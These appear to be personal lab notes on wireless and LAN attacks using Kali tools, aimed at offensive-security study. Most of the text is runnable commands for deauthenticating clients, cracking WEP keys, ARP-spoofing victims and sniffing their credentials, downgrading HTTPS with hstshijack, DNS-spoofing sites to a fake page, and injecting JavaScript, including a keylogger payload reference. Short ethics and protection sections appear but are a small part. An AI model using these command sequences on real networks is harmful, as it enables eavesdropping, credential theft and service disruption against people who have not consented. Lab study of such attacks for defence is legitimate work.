
# Network hacking part 1

## **Step 1: Connect Wireless Adapter to Kali**

1. **Shut down Kali** if it's running.
2. **Plug in the USB wireless adapter** to your host machine.
3. Open **VMware Workstation**:
    - Go to Kali VM → `Settings` → `Add` → `USB Controller`.
    - Set compatibility to **USB 3.1**.
    - Enable **"Show all USB input devices"**.
4. Start Kali and go to:
    - `VMware Menu → Removable Devices → Your Adapter → Connect`.

---

##  **Step 2: Verify Network Interfaces in Kali**


```bash
ifconfig # or modern alternative ip link show`
```

- Confirm adapter is listed (e.g., wlan0).

---

##  **Step 3: Enable Monitor Mode on Wireless Adapter**



```bash
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up iwconfig # Confirm "Mode: Monitor"
````

> Optional: Use `sudo airmon-ng start wlan0` to auto-handle steps.

---

##  **Step 4: Change Your MAC Address**

1. **Bring the interface down:**

```bash
sudo ifconfig wlan0 down
```

2. **Change MAC (random or manual):**

```bash
sudo macchanger -r wlan0 # OR sudo macchanger --mac=00:11:22:33:44:55 wlan0
```

3. **Bring interface up & verify:**
```bash
sudo ifconfig wlan0 up
macchanger -s wlan0
```

---

##  **Step 5: Perform a Pre-Connection Recon Attack**

1. Use `airodump-ng` to scan available networks
```bash
sudo airodump-ng wlan0
```

2. Identify:
    - BSSID (MAC) of target router
    - Channel (CH)
    - Security type (WEP/WPA2)
3. Target a specific network:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0 -w capture
```
---

##  **Step 6: Capture Handshake for WPA2 Cracking**

 You can skip actual cracking if doing safe, ethical testing. Use tools:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
```

 This forces the target (Windows VM or real device) to reconnect, capturing a handshake.

---

##  **Step 7: Analyze Captured Data**

Use tools like:

 View packets in terminal tcpdump -i wlan0  # GUI analysis wireshark`

- Filter: `eapol` (to view WPA handshake)
- Filter: `http` or `dns` (to view browsing activity if not encrypted)

---

## **Step 8: Perform Post-Connection Attacks (from Kali to Win VM)**

### a. **Enable IP Forwarding & Start BetterCap**

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo bettercap -iface wlan0
```

### b. **Run ARP Spoofing in BetterCap**

In BetterCap console:

```csharp
net.probe on set arp.spoof.targets <Windows_VM_IP> arp.spoof on
```

### c. **Sniff Data**

```csharp
net.sniff on
```



---
---

# WiFi Pre-Connection Attacks: Practical Guide

## Introduction

Pre-connection attacks allow you to gather information about WiFi networks without having to connect to them. This guide covers the essential techniques for packet sniffing and network reconnaissance using Airodump-ng.


## Practical Steps

### Step 1: Setting Up Monitor Mode

Monitor mode allows your WiFi adapter to capture all packets in the air, not just those addressed to your device.



```bash
# Check current wireless interfaces
iwconfig

# Stop NetworkManager to prevent interference
sudo systemctl stop NetworkManager

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig
```

Notes:

- Your interface might change from `wlan0` to `wlan0mon` or `mon0` after enabling monitor mode
- Look for "Mode: Monitor" in the iwconfig output
- If monitor mode fails, some adapters require different commands or might not support it at all

### Step 2: Basic Network Scanning



```bash
# Scan all wireless networks in range
sudo airodump-ng wlan0mon
```

#### Understanding the Output

The display is divided into two sections:

**Top Section (Access Points):**

- **BSSID** - MAC address of the access point
- **PWR** - Signal strength (closer to 0 means stronger)
- **Beacons** - Number of beacon frames
- **#Data** - Number of data packets captured
- **CH** - Channel number
- **MB** - Maximum speed supported
- **ENC** - Encryption type (WEP, WPA, WPA2, etc.)
- **CIPHER** - Cipher being used
- **AUTH** - Authentication method
- **ESSID** - Network name

**Bottom Section (Connected Clients):**

- **BSSID** - MAC of the access point
- **STATION** - MAC of the connected client
- **PWR** - Signal strength
- **Rate** - Data rate in Mbps
- **Lost** - Number of lost packets
- **Frames** - Number of frames sent by client
- **Probe** - Networks the client is probing for

### Step 3: Scanning Different WiFi Bands

WiFi networks operate on two main frequency bands:

bash

```bash
# Scan only 2.4 GHz networks (default)
sudo airodump-ng wlan0mon

# Scan only 5 GHz networks
sudo airodump-ng --band a wlan0mon

# Scan both 2.4 GHz and 5 GHz
sudo airodump-ng --band abg wlan0mon

# Scan only a specific channel
sudo airodump-ng -c 6 wlan0mon
```

Band options:

- `a` - 5 GHz band
- `b` - Legacy 802.11b devices (2.4 GHz)
- `g` - 2.4 GHz band
- `n` - Uses both 2.4 GHz and 5 GHz bands
- `ac` - Uses frequencies below 6 GHz

### Step 4: Targeting a Specific Network

Once you've identified a target network, you can focus your scanning:

bash

```bash
# Target a specific network and save data
sudo airodump-ng --bssid [TARGET_MAC] --channel [CHANNEL] --write [FILENAME] wlan0mon
```

Replace:

- `[TARGET_MAC]` with the BSSID of the target network
- `[CHANNEL]` with the channel number of the target network
- `[FILENAME]` with your preferred output filename

This command:

- Shows only the target network and its connected clients
- Saves the packets to files with the provided filename
- Creates multiple files with different extensions (.cap, .csv, .kismet.csv, .kismet.netxml)

### Step 5: Packet Analysis with Wireshark

Once you've captured packets, you can analyze them with Wireshark:

bash

```bash
# Open Wireshark from terminal
sudo wireshark [FILENAME]-01.cap
```

Note: If the network uses encryption (WPA/WPA2), you'll see the packets but won't be able to read the actual data payload without the network key.

## Additional Techniques

### Finding Hidden Networks

Hidden networks don't broadcast their SSID but can still be detected:

bash

```bash
# Run standard scanning
sudo airodump-ng wlan0mon
```

Look for networks with:

- A blank ESSID
- Clients connected to them (shown in the bottom section)

### Deauthentication Reconnaissance

While this will be covered in more detail later, this technique can reveal:

- Hidden SSIDs
- Clients that aren't currently connected
- Force WPA handshakes

bash

```bash
# Basic deauth command
sudo aireplay-ng --deauth 3 -a [AP_MAC] wlan0mon
```
## Key Concepts

### WiFi Bands Comparison

|Feature|2.4 GHz|5 GHz|
|---|---|---|
|Range|Longer range|Shorter range|
|Speed|Slower speeds|Faster speeds|
|Congestion|More crowded|Less crowded|
|Interference|High (many devices)|Low (fewer devices)|
|Wall penetration|Better|Worse|
|Channels|Fewer usable channels|More available channels|

### WiFi Packet Types

- **Management Frames**: Control network operation (beacons, probe requests, authentication)
- **Control Frames**: Assist with delivery of data (ACK, RTS, CTS)
- **Data Frames**: Contain the actual data being transmitted


---
---

# WEP Cracking Practical Guide

## Practical Steps

### Step 1: Set Up a Test Environment

#### Option 1: Using airbase-ng

```bash
# Create a dummy WEP network
sudo airbase-ng -a 00:11:22:33:44:55 --essid "wep_network" -c 6 -w text_z wlan0

# Set IP address for the virtual interface
sudo ifconfig at0 up
sudo ifconfig at0 192.168.1.2 netmask 255.255.255.0
```

#### Option 2: Using hostapd

```bash
# Install required packages
sudo apt install hostapd dnsmasq

# Create hostapd configuration file
sudo nano /etc/hostapd/hostapd.conf

# Add the following content:
interface=wlan0
ssid=TestAP_WEP
channel=6
auth_algs=1
wep_default_key=0
wep_key0=1234567890

# Launch the access point
sudo hostapd /etc/hostapd/hostapd.conf
```

### Step 2: Prepare Your Wireless Adapter

```bash
# Check available wireless interfaces
ifconfig

# Verify adapter capabilities
iwconfig

# Stop NetworkManager to prevent interference
sudo systemctl stop NetworkManager

# Disable the wireless interface
sudo ifconfig wlan0 down

# Set the adapter to monitor mode
sudo iwconfig wlan0 mode monitor

# Enable the interface again
sudo ifconfig wlan0 up

# Verify monitor mode is active
iwconfig
```

Note: Your interface may appear as `mon0`, `wlan0mon`, or similar after enabling monitor mode.

### Step 3: Scan for Networks

```bash
# Scan for all available wireless networks
sudo airodump-ng mon0
```

Important information displayed:

- **BSSID**: MAC address of the access point
- **CH**: Channel number
- **ENC**: Encryption type (look for WEP)
- **ESSID**: Network name
- **Data**: Number of data packets captured

Identify a WEP network and note its BSSID and channel.

### Step 4: Target and Capture Packets

```bash
# Focus capture on the target WEP network
sudo airodump-ng --bssid <TARGET_BSSID> --channel <CHANNEL> --write wep_capture mon0
```

Replace:

- `<TARGET_BSSID>` with the MAC address of the target network
- `<CHANNEL>` with the channel number of the target network

This command will save captured packets to files with the prefix `wep_capture`.

### Step 5: Speed Up Data Collection

If the data collection is slow (common with WEP networks), you can use the following techniques:

#### A. Fake Authentication

```bash
# Get your wireless adapter's MAC address
ifconfig mon0 | grep ether

# Perform fake authentication with the target network
sudo aireplay-ng --fakeauth 0 -a <TARGET_BSSID> -h <YOUR_MAC> mon0
```

Replace:

- `<TARGET_BSSID>` with the target network's MAC address
- `<YOUR_MAC>` with your wireless adapter's MAC address

You should see "Association successful :-)" if it works.

#### B. ARP Request Replay Attack

This technique significantly increases the number of IVs captured:

```bash
# First authenticate with the network
sudo aireplay-ng --fakeauth 0 -a <TARGET_BSSID> -h <YOUR_MAC> mon0

# Then perform the ARP replay attack
sudo aireplay-ng --arpreplay -b <TARGET_BSSID> -h <YOUR_MAC> mon0
```

Watch the data counter in your airodump-ng window - it should increase rapidly.

### Step 6: Crack the WEP Key

Once you've collected enough IVs (20,000-40,000 for 64-bit WEP or 85,000-100,000 for 128-bit WEP):

```bash
# Crack the WEP key using collected packets
sudo aircrack-ng wep_capture-01.cap
```

If successful, you'll see a message like:

```
KEY FOUND! [ 1A:2B:3C:4D:5E ]
Decrypted correctly: 100%
```

### Step 7: Verify the Key

```bash
# Remove the colons from the key
# Convert from hex to ASCII if needed (optional)
echo "1A:2B:3C:4D:5E" | tr -d ':' | xxd -r -p

# Connect to the network using the key
sudo iwconfig wlan0 essid <NETWORK_NAME> key <WEP_KEY>
```


## Understanding the Process

### Key Concepts

1. **Initialization Vectors (IVs)**
    
    - WEP uses a 24-bit IV combined with the key for encryption
    - The small IV size leads to inevitable reuse
    - Each captured packet with a unique IV improves cracking chances
2. **RC4 Algorithm Weakness**
    
    - The implementation in WEP makes statistical attacks possible
    - With enough IVs, patterns emerge that reveal the key
3. **Monitor Mode vs. Managed Mode**
    
    - Monitor mode: Captures all packets regardless of destination
    - Managed mode: Only processes packets addressed to your device

## Ethical Considerations

1. Always obtain permission before testing any network
2. Document all testing activities
3. Report findings to network owners
4. Recommend upgrading from WEP to WPA2/WPA3
5. Use this knowledge to improve security, not compromise it

----
-----

# Network Hacking: Man-in-the-Middle Attack Guide

## Introduction to BetterCap

BetterCap is an advanced network attack and monitoring tool that offers capabilities beyond basic ARP spoofing:

- **Key Features**:
    - ARP spoofing to intercept connections
    - Capturing credentials and sensitive data
    - HTTPS downgrade attacks and HSTS bypassing
    - DNS spoofing for traffic redirection
    - Code injection into loaded webpages
    - Comprehensive network security assessment

BetterCap operates through modules, making it highly flexible for different attack scenarios.

## Installation and Setup

### Installing BetterCap

```bash
sudo apt install bettercap
```

### Running BetterCap

Basic execution:

```bash
bettercap
```

With specific network interface:

```bash
bettercap -iface eth0
```

### Getting Help

```bash
# General help
bettercap --help

# Module-specific help
help <module_name>
# Example:
help net.probe
```

## Discovering Network Devices

### Finding Your Network Interface

```bash
ifconfig
```

Note your active interface (eth0, wlan0, etc.)

### Discovering Devices on the Network

1. Start BetterCap with your interface:
    
    ```bash
    bettercap -iface eth0
    ```
    
2. Enable network probing:
    
    ```bash
    net.probe on
    ```
    
    This automatically activates `net.recon`
3. View discovered devices:
    
    ```bash
    net.show
    ```
    
    This displays:
    - IP addresses
    - MAC addresses
    - Router/gateway IP
    - Device manufacturers (when available)

## ARP Spoofing with BetterCap

### Step-by-Step Process

1. Start BetterCap with your interface:
    
    ```bash
    bettercap -iface eth0
    ```
    
2. Check the ARP spoofing module options:
    
    ```bash
    help arp.spoof
    ```
    
3. Enable full duplex mode (spoof both target and router):
    
    ```bash
    set arp.spoof.fullduplex true
    ```
    
4. Set your target's IP address:
    
    ```bash
    set arp.spoof.targets 192.168.1.100
    ```
    
    Multiple targets can be specified with commas:
    
    ```bash
    set arp.spoof.targets 192.168.1.100,192.168.1.101
    ```
    
5. Start the ARP spoofing attack:
    
    ```bash
    arp.spoof on
    ```
    
6. Optional: Disconnect target from network:
    
    ```bash
    # To cut target's connection
    arp.ban on
    
    # To restore target's connection
    arp.ban off
    ```
    

## Capturing Network Traffic

Once the MITM position is established, you can capture and analyze traffic:

### HTTP Proxy (For HTTP Traffic)

```bash
http.proxy on
```

This intercepts unencrypted HTTP traffic and displays visited websites, form submissions, and credentials.

### Network Sniffing (For All Traffic)

```bash
net.sniff on
```

This captures all data passing through your machine, including:

- Websites visited
- Resources loaded
- Form submissions (usernames, passwords on HTTP sites)

### Testing Your Capture Setup

On the victim machine:

1. Clear browser cache (Ctrl+Shift+Del)
2. Visit unencrypted test sites like:
    - [http://testphp.vulnweb.com](http://testphp.vulnweb.com)
    - [http://testhtml5.vulnweb.com](http://testhtml5.vulnweb.com)
3. Submit test login credentials
4. Observe captured data in your BetterCap terminal

## Creating Custom Scripts

For convenience, create a caplet file (script) to automate the attack process:

1. Create a file named `spoof.cap` with these commands:
    
    ```
    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets 192.168.1.100
    arp.spoof on
    net.sniff on
    ```
    
2. Run BetterCap with your custom caplet:
    
    ```bash
    bettercap -iface eth0 -caplet spoof.cap
    ```
    

## Bypassing HTTPS

### Understanding HTTPS Protection

- HTTPS encrypts data between the browser and website
- Encrypted data appears as gibberish to attackers
- The hacker's goal is to downgrade HTTPS to HTTP

### Using hstshijack Caplet

1. Modify your `spoof.cap` file to include:
    
    ```
    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets 192.168.1.100
    arp.spoof on
    set net.sniff.local true
    net.sniff on
    ```
    
2. Run BetterCap with the modified caplet:
    
    ```bash
    bettercap -iface eth0 -caplet spoof.cap
    ```
    
3. List and run the HSTS hijack caplet:
    
    ```bash
    caplets.show
    hstshijack
    ```
    
4. Testing on victim machine:
    - Clear browser cache completely
    - Visit HTTPS websites
    - Submit login credentials
    - Check your terminal for captured data

### Bypassing HSTS

HSTS (HTTP Strict Transport Security) forces browsers to use HTTPS. To bypass:

1. Use Firefox for testing
2. Start BetterCap with hstshijack.cap
3. Visit local Google domains (google.ie, google.in) that may have weaker HSTS
4. Search for secure sites (GitHub, Facebook)
5. Hover over results to see domain replacement (github.com → github.corn)
6. For Chrome: disable secure DNS first

## DNS Spoofing

### Hosting a Fake Website

1. Start Apache web server:
    
    ```bash
    service apache2 start
    ```
    
2. Edit the default webpage:
    
    ```bash
    # Navigate to web directory
    cd /var/www/html
    
    # Edit index.html with your content
    nano index.html
    ```
    
3. Test by visiting your Kali IP in a browser

### DNS Spoofing Setup

1. Run BetterCap:
    
    ```bash
    bettercap -iface eth0 -caplet spoof.cap
    ```
    
2. Configure DNS spoofing:
    
    ```bash
    set dns.spoof.all true
    set dns.spoof.domains example.com,*example.com
    ```
    
3. Start DNS spoofing:
    
    ```bash
    dns.spoof on
    ```
    
4. Result: When the victim visits example.com, they'll see your fake website

## JavaScript Injection

### Creating JavaScript to Inject

1. Create a simple JavaScript file:
    
    ```bash
    echo 'alert("JavaScript test");' > /root/alert.js
    ```
    
2. Modify the HSTS hijack configuration:
    
    ```bash
    cd /usr/local/share/bettercap/caplets/hstshijack/
    nano hstshijack.cap
    ```
    
3. Find and modify the payloads line:
    
    ```
    # From:
    set hstshijack.payloads *:/root/keylogger.js
    
    # To:
    set hstshijack.payloads *:/root/keylogger.js,*:/root/alert.js
    ```
    
    Or target specific domains:
    
    ```
    set hstshijack.payloads example.com:/root/alert.js
    ```
    
4. Save and run BetterCap with hstshijack
5. When the victim browses websites, they'll see your JavaScript alert popup

## Summary and Protection Measures

### Key BetterCap Commands

|Command|Description|
|---|---|
|`help arp.spoof`|Shows help for the ARP spoof module|
|`set arp.spoof.fullduplex true`|Spoofs both router and victim|
|`set arp.spoof.targets <IP>`|Sets the target IP|
|`arp.spoof on`|Starts the ARP spoof attack|
|`arp.ban on`|Disconnects the victim|
|`http.proxy on`|Starts HTTP interception|
|`net.sniff on`|Starts packet sniffing|
|`dns.spoof on`|Enables DNS spoofing|

### Protection Against These Attacks

For organizations and individuals:

- Use HTTPS-only websites
- Implement proper HSTS configuration
- Use VPNs for sensitive connections
- Monitor network for suspicious ARP traffic
- Implement static ARP entries for critical devices
- Use encrypted DNS (DoH/DoT)
- Keep browsers updated to benefit from latest security features
